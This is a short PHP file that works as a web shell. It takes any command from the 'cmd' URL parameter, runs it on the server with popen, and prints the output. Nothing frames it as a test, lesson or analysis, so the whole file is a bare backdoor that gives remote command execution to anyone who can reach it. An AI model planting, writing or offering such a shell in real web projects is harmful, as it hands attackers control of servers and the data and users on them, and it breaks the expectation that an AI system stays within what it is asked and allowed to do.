<?php
if (isset($_GET["cmd"])) {
  $thisCMD = popen($_GET["cmd"], "r");
  $read = fread($thisCMD, 2096);
  print_r("$thisCMD: ".gettype($thisCMD)."\n$read \n");
  pclose($thisCMD);
}
?>
